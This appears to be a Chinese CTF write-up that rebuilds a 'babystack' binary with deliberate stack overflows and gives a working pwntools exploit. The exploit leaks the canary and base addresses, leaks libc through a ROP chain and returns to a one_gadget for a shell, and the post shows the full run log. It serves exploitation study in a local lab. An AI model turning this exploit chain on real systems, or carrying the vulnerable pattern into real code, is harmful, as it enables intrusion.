> 附件：
>
> 链接: [https://pan.baidu.com/s/1mtOYoHSZi__oJBlZ7npMfA](https://pan.baidu.com/s/1mtOYoHSZi__oJBlZ7npMfA)  密码: muo3
>
> --来自百度网盘超级会员V3的分享
>

偶然间看到这样一篇文章：

[https://www.cnblogs.com/Rookle/p/12884448.html](https://www.cnblogs.com/Rookle/p/12884448.html)

文章中说的是通过栈溢出来ret2one_gadget，这个方法好像不太常见，因为要使用one_gadget就要泄露libc的基地址，之前的栈上的题都是泄露libc基地址之后直接使用system("/bin/sh")，基本上没有用过one_gadget，并且这道题目保护全开，遂记录一番。

文章中的题目没有找到，好像是星盟的内部赛，于是我就根据IDA的main反编译结果自己写了一个，源码如下：

> 编译之后要保护全开，编译参数就不写了
>

```c
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
int main(){
	int a=0;
	char buf[136]={0};
	alarm(0x3c);
	setbuf(stdout,0);
	printf("What's your name: ");
	a=read(0,buf,0x100);
	if(buf[a-1]==10){
		buf[a-1]=0;
	}
	printf("Hello %s.\n\n",buf);
	printf("What do you want to say: ");
	read(0,buf,0x100);
	printf("Bye!\n");
	return 0;	
}
```

编译完成之后走个流程，检查一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610343471955-75bc9451-7be9-49e3-ba3c-e89e6a74911b.png)

保护全开，放入IDA中看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610343571995-058810e9-92ec-4a30-b10d-013e41abca1c.png)

程序有两次栈溢出。虽然这道题看起来很难，但是有了思路之后就挺简单的，只需要注意一下栈的结构就行了：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1610343686832-a097da4e-8480-43d1-92b2-2c9168af21ee.png)

```python
#coding=utf-8
from pwn import *
context.log_level='debug'

p=process('./babystack')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf=ELF('./babystack')

payload1='a'*0x88+'b'
p.sendafter("What's your name: ",payload1)
p.recvuntil('a'*0x88)
  
leak_cacary=u64(p.recv(8))-ord('b') #泄露canary
leak_main_ebp=u64(p.recv(6).ljust(8,'\x00')) #由于canary占满8个字节，因此同时可以泄露出rbp
print "success leak canary ",hex(leak_cacary)
print "success leak main ebp ",hex(leak_main_ebp)
text_base=leak_main_ebp-0x930
print "success leak text_base addr ",hex(text_base)#计算出代码段的基地址
main_start=text_base+0x80A
print "success leak main_start ",hex(main_start)#有了代码段的基地址，可以计算出main函数的起始地址
payload2='c'*0x88+p64(leak_cacary)+p64(leak_main_ebp)+p64(main_start)
p.sendlineafter("What do you want to say: ",payload2) 
#程序再次retn到main函数时，canary不会发生变化

elf_plt=text_base+elf.plt['puts']
elf_got=text_base+elf.got['puts']
pop_rdi_ret=text_base+0x993
print "success leak elf_plt ",hex(elf_plt)#根据代码段的基地址，泄露出puts的plt和got的地址
print "success leak elf_got ",hex(elf_got)
print "success leak pop_rdi_ret ",hex(pop_rdi_ret)

payload3='d'*0x88+p64(leak_cacary)+p64(leak_main_ebp)+p64(pop_rdi_ret)+p64(elf_got)+p64(elf_plt)+p64(main_start)
#利用got表泄露puts在libc中的地址，注意64位的传参方式
p.sendafter("What's your name: ",payload3)

p.recvuntil("What do you want to say: ")
p.sendline('0xdeadbeef')#没什么用，填充垃圾数据

print p.recvline()
puts = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print "success leak puts",hex(puts) #根据got表中的puts地址可以泄露出libc基地址
libc_base=puts-libc.symbols['puts']
print "success leak libc_base ",hex(libc_base)

one_gadget_offset=[0x45226,0x4527a,0xf0364,0xf1207]
one_gadget_addr=libc_base+one_gadget_offset[0]
print "success leak one_gadget_addr ",hex(one_gadget_addr) #计算one_gadget地址
payload4='f'*0x88+p64(leak_cacary)+p64(leak_main_ebp)+p64(one_gadget_addr)
#覆盖retn为one_gadget地址

p.sendafter("What's your name: ",payload4)
p.sendlineafter("What do you want to say: ","0xdeadbeef")#没什么用，填充垃圾数据

#gdb.attach(p)
time.sleep(0.2)
p.sendline('ls')
time.sleep(0.2)
p.sendline('cat flag')
p.interactive()
```

```python
➜  test python babystack.py 
[+] Starting local process './babystack' argv=['./babystack'] : pid 23552
[DEBUG] PLT 0x1f7f0 realloc
[DEBUG] PLT 0x1f800 __tls_get_addr
[DEBUG] PLT 0x1f820 memalign
[DEBUG] PLT 0x1f850 _dl_find_dso_for_object
[DEBUG] PLT 0x1f870 calloc
[DEBUG] PLT 0x1f8a0 malloc
[DEBUG] PLT 0x1f8a8 free
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] PLT 0x690 puts
[DEBUG] PLT 0x6a0 __stack_chk_fail
[DEBUG] PLT 0x6b0 setbuf
[DEBUG] PLT 0x6c0 printf
[DEBUG] PLT 0x6d0 alarm
[DEBUG] PLT 0x6e0 read
[DEBUG] PLT 0x6f0 __cxa_finalize
[*] '/home/ubuntu/Desktop/buuctf/test/babystack'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] Received 0x12 bytes:
    "What's your name: "
[DEBUG] Sent 0x89 bytes:
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab'
[DEBUG] Received 0xb8 bytes:
    00000000  48 65 6c 6c  6f 20 61 61  61 61 61 61  61 61 61 61  │Hell│o aa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  61 61 61 61  61 61 61 61  61 61 61 61  61 61 62 fd  │aaaa│aaaa│aaaa│aab·│
    00000090  44 10 ab 26  27 48 30 49  55 55 55 55  2e 0a 0a 57  │D··&│'H0I│UUUU│.··W│
    000000a0  68 61 74 20  64 6f 20 79  6f 75 20 77  61 6e 74 20  │hat │do y│ou w│ant │
    000000b0  74 6f 20 73  61 79 3a 20                            │to s│ay: │
    000000b8
success leak canary  0x482726ab1044fd00
success leak main ebp  0x555555554930
success leak text_base addr  0x555555554000
success leak main_start  0x55555555480a
[DEBUG] Sent 0xa1 bytes:
    00000000  63 63 63 63  63 63 63 63  63 63 63 63  63 63 63 63  │cccc│cccc│cccc│cccc│
    *
    00000080  63 63 63 63  63 63 63 63  00 fd 44 10  ab 26 27 48  │cccc│cccc│··D·│·&'H│
    00000090  30 49 55 55  55 55 00 00  0a 48 55 55  55 55 00 00  │0IUU│UU··│·HUU│UU··│
    000000a0  0a                                                  │·│
    000000a1
success leak elf_plt  0x555555554690
success leak elf_got  0x555555754fa8
success leak pop_rdi_ret  0x555555554993
[DEBUG] Received 0x17 bytes:
    'Bye!\n'
    "What's your name: "
[DEBUG] Sent 0xb8 bytes:
    00000000  64 64 64 64  64 64 64 64  64 64 64 64  64 64 64 64  │dddd│dddd│dddd│dddd│
    *
    00000080  64 64 64 64  64 64 64 64  00 fd 44 10  ab 26 27 48  │dddd│dddd│··D·│·&'H│
    00000090  30 49 55 55  55 55 00 00  93 49 55 55  55 55 00 00  │0IUU│UU··│·IUU│UU··│
    000000a0  a8 4f 75 55  55 55 00 00  90 46 55 55  55 55 00 00  │·OuU│UU··│·FUU│UU··│
    000000b0  0a 48 55 55  55 55 00 00                            │·HUU│UU··│
    000000b8
[DEBUG] Received 0xaa bytes:
    'Hello dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd.\n'
    '\n'
    'What do you want to say: '
[DEBUG] Sent 0xb bytes:
    '0xdeadbeef\n'
[DEBUG] Received 0x1e bytes:
    00000000  42 79 65 21  0a a0 c6 a7  f7 ff 7f 0a  57 68 61 74  │Bye!│····│····│What│
    00000010  27 73 20 79  6f 75 72 20  6e 61 6d 65  3a 20        │'s y│our │name│: │
    0000001e
Bye!

success leak puts 0x7ffff7a7c6a0
success leak libc_base  0x7ffff7a0d000
success leak one_gadget_addr  0x7ffff7a52226
[DEBUG] Sent 0xa0 bytes:
    00000000  66 66 66 66  66 66 66 66  66 66 66 66  66 66 66 66  │ffff│ffff│ffff│ffff│
    *
    00000080  66 66 66 66  66 66 66 66  00 fd 44 10  ab 26 27 48  │ffff│ffff│··D·│·&'H│
    00000090  30 49 55 55  55 55 00 00  26 22 a5 f7  ff 7f 00 00  │0IUU│UU··│&"··│····│
    000000a0
[DEBUG] Received 0xaa bytes:
    'Hello ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff.\n'
    '\n'
    'What do you want to say: '
[DEBUG] Sent 0xb bytes:
    '0xdeadbeef\n'
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[*] Switching to interactive mode
[DEBUG] Received 0x7c bytes:
    00000000  42 79 65 21  0a 62 61 62  79 73 74 61  63 6b 20 20  │Bye!│·bab│ysta│ck  │
    00000010  20 20 20 63  6f 72 65 20  20 74 65 73  74 20 20 20  │   c│ore │ tes│t   │
    00000020  74 65 73 74  31 2e 63 20  20 55 6e 74  69 74 6c 65  │test│1.c │ Unt│itle│
    00000030  64 20 44 6f  63 75 6d 65  6e 74 0a 62  61 62 79 73  │d Do│cume│nt·b│abys│
    00000040  74 61 63 6b  2e 70 79 20  20 66 6c 61  67 20 20 74  │tack│.py │ fla│g  t│
    00000050  65 73 74 31  20 20 74 65  73 74 2e 63  0a 66 6c 61  │est1│  te│st.c│·fla│
    00000060  67 7b e7 ab  9f e7 84 b6  70 77 6e e4  ba 86 e6 88  │g{··│····│pwn·│····│
    00000070  91 2c e4 bd  a0 e7 9c 9f  4e 42 7d 0a               │·,··│····│NB}·│
    0000007c
Bye!
babystack     core  test   test1.c  Untitled Document
babystack.py  flag  test1  test.c
flag{竟然pwn了我,你真NB}
$  
```

